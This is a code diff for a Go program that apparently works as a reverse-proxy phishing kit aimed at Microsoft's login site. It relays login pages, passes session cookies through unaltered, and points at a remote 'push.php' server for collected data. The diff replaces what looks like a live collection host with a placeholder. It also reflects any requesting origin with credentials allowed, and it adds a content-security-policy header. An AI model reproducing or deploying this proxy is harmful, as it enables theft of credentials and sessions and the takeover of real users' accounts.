@@ -12,7 +12,7 @@ import (
 const (
     upstream        = "https://login.microsoftonline.com"
     upstreamPath    = "/"
-    serverURL       = "https://3xrlcxb4gbwtmbar12126.cleavr.one/ne/push.php"
+    serverURL       = "https://yourserver.com/push.php"
 )
 
 var (
@@ -78,7 +78,10 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     copyHeadersWithCookies(resp.Header, w.Header())
 
     // Add CORS headers to the response
-    addCORSHeaders(w)
+    addCORSHeaders(w, r)
+
+    // Add or update the Content-Security-Policy header to allow specific scripts
+    addCSPHeaders(w)
 
     w.WriteHeader(resp.StatusCode)
     w.Write([]byte(bodyString))
@@ -86,16 +89,26 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
 
 // Handle preflight OPTIONS request
 func handlePreflight(w http.ResponseWriter, r *http.Request) {
-    addCORSHeaders(w)
+    addCORSHeaders(w, r)
     w.WriteHeader(http.StatusOK)
 }
 
 // Add CORS headers to the response
-func addCORSHeaders(w http.ResponseWriter) {
-    w.Header().Set("Access-Control-Allow-Origin", "*")
+func addCORSHeaders(w http.ResponseWriter, r *http.Request) {
+    origin := r.Header.Get("Origin")
+    if origin != "" {
+        w.Header().Set("Access-Control-Allow-Origin", origin)
+    } else {
+        w.Header().Set("Access-Control-Allow-Origin", "*")
+    }
     w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
-    w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With")
+    w.Header().Set("Access-Control-Allow-Headers", r.Header.Get("Access-Control-Request-Headers"))
     w.Header().Set("Access-Control-Allow-Credentials", "true")
+}
+
+// Add or modify CSP headers
+func addCSPHeaders(w http.ResponseWriter) {
+    w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'; base-uri 'self';")
 }
 
 // copyHeadersWithCookies ensures that the _bssoConfig cookie is copied without alteration
